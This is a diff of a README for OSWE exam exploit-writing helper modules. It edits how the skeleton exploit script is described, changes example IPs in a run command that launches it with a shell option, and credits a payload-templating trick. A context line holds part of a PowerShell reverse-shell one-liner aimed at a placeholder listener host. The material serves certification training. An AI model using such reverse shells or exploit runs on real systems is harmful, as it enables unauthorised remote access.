@@ -16,10 +16,10 @@ Helper modules for writing OSWE exploit scripts. Pull what you need into your sc
 └── websocket_helper.py     # WebSocket response drainer (targets with WS interfaces)
 ```
 
-`exploit.py` has everything inlined – copy it to the exam machine and fill in the stage functions. The other files are reference copies; paste functions from them as needed.
+`exploit.py` is a barebone skeleton: session setup, argument parsing, and an empty exploit chain. Copy it to the exam machine, paste in the helpers the target needs from the other files, and fill in the stage functions.
 
 ```bash
-python3 exploit.py -t 192.168.1.100 -l 10.10.10.10 --shell
+python3 exploit.py -t 10.10.10.10 -l 10.10.14.5 --shell
 ```
 
 ---
@@ -127,7 +127,7 @@ $c=New-Object Net.Sockets.TCPClient('<lhost>',<lport>);$s=$c.GetStream();[byte[]
 
 One server that does two things: serves files to the victim and captures whatever the victim sends back.
 
-Hardcode your payloads as constants at the top of the script, using `.replace()` for LHOST/LPORT:
+Hardcode your payloads as constants at the top of the script, using `.replace()` for LHOST/LPORT (full credits to [rizemon/exploit-writing-for-oswe](https://github.com/rizemon/exploit-writing-for-oswe) for this neat trick!):
 
 ```python
 JS_PAYLOAD = """
